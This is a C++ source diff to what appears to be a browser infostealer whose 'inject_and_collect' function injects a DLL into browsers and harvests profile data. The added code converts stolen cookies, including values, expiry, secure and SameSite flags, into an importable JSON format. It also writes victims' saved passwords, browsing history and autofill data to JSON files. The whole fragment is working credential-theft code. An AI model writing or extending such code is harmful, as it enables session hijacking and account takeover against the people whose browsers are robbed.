@@ -6,6 +6,9 @@
 #include <algorithm>
 #include <fstream>
 #include <filesystem>
+#include <ctime>
+#include <iomanip>
+#include <sstream>
 #include <cctype>
 #include <cwctype>
 #include "bootstrapper.h"
@@ -245,10 +248,67 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
 
                         std::string p_cook = (profile_dir / "cookies.txt").string();
                         std::ofstream cookie_file(p_cook);
+                        json cookie_json_list = json::array();
                         for (auto& c : profiles[i]["cookies"]) {
-                            cookie_file << "Host: " << c["host"].get<std::string>() << " | Name: " << c["name"].get<std::string>() << " | Value: " << c["value"].get<std::string>() << "\n";
+                            std::string host = c["host"].get<std::string>();
+                            std::string name = c["name"].get<std::string>();
+                            std::string val = c["value"].get<std::string>();
+                            std::string path = c["path"].get<std::string>();
+                            long long exp_utc = c["expires_utc"].get<long long>();
+                            int secure = c["is_secure"].get<int>();
+                            int httponly = c["is_httponly"].get<int>();
+                            int samesite = c["samesite"].get<int>();
+
+                            cookie_file << "Host: " << host << " | Name: " << name << " | Value: " << val << "\n";
+
+                            // Format Cookie JSON
+                            json cj;
+                            std::string host_raw = host;
+                            if (host_raw.find("http") != 0) {
+                                if (host_raw[0] == '.') host_raw = "https://" + host_raw;
+                                else host_raw = "https://" + host_raw;
+                            }
+                            if (host_raw.back() != '/') host_raw += "/";
+
+                            cj["Host raw"] = host_raw;
+                            cj["Name raw"] = name;
+                            cj["Path raw"] = path;
+                            cj["Content raw"] = val;
+
+                            // Convert Webkit timestamp to Unix and Format Date
+                            long long unix_ts = (exp_utc / 1000000) - 11644473600LL;
+                            std::time_t t = (std::time_t)unix_ts;
+                            struct tm *tm_ptr = std::gmtime(&t);
+                            std::string date_str = "";
+                            if (tm_ptr) {
+                                std::ostringstream oss;
+                                oss << std::put_time(tm_ptr, "%d-%m-%Y %H:%M:%S");
+                                date_str = oss.str();
+                            }
+
+                            cj["Expires"] = date_str;
+                            cj["Expires raw"] = std::to_string(unix_ts);
+                            cj["Send for"] = secure ? "Encrypted connections only" : "Any type of connection";
+                            cj["Send for raw"] = secure ? "true" : "false";
+                            cj["HTTP only raw"] = httponly ? "true" : "false";
+
+                            std::string ss_str = "no_restriction";
+                            if (samesite == 1) ss_str = "lax";
+                            else if (samesite == 2) ss_str = "strict";
+                            cj["SameSite raw"] = ss_str;
+
+                            cj["This domain only"] = (host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
+                            cj["This domain only raw"] = (host[0] == '.') ? "false" : "true";
+                            cj["First Party Domain"] = "";
+
+                            cookie_json_list.push_back(cj);
                         }
                         cookie_file.close();
+
+                        std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4);
+                        std::ofstream(profile_dir / "passwords.json") << profiles[i]["passwords"].dump(4);
+                        std::ofstream(profile_dir / "history.json") << profiles[i]["history"].dump(4);
+                        std::ofstream(profile_dir / "autofill.json") << profiles[i]["autofill"].dump(4);
 
                         std::string p_hist = (profile_dir / "history.txt").string();
                         std::ofstream hist_file(p_hist);
